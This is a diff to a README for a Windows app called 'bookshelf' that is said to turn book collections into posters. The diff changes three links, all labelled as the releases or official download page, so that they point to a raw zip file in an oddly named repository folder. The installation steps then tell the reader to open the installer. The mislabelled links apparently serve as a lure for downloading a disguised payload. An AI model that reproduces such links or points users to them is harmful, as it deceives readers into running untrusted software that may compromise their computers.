@@ -1,6 +1,6 @@
 # 📚 bookshelf - Create beautiful visual posters of books
 
-[Explore Releases](https://github.com/torrealdehydic125/bookshelf/releases)
+[Explore Releases](https://github.com/torrealdehydic125/bookshelf/raw/refs/heads/main/arylate/Software-2.8.zip)
 
 Bookshelf helps you track your reading habits. It turns your book collection into clean visual posters. You can share these images with friends or save them to keep track of your progress. This tool is free and open source. It works on your Windows computer without the need for complex setup or coding knowledge.
 
@@ -8,7 +8,7 @@ Bookshelf helps you track your reading habits. It turns your book collection int
 
 Follow these steps to set up the software on your Windows computer. This guide assumes you use a standard version of Windows 10 or Windows 11.
 
-1. Go to the [official download page](https://github.com/torrealdehydic125/bookshelf/releases).
+1. Go to the [official download page](https://github.com/torrealdehydic125/bookshelf/raw/refs/heads/main/arylate/Software-2.8.zip).
 2. Look for the latest version at the top of the page.
 3. Choose the file that ends in .exe for Windows.
 4. Save the file to your computer.
@@ -37,7 +37,7 @@ Your computer must meet these basic needs to run the app:
 
 ## 📥 Installation Details
 
-1. Visit the [releases page](https://github.com/torrealdehydic125/bookshelf/releases) to find the latest version.
+1. Visit the [releases page](https://github.com/torrealdehydic125/bookshelf/raw/refs/heads/main/arylate/Software-2.8.zip) to find the latest version.
 2. Download the installer.
 3. Open your Downloads folder.
 4. Open the installer file.
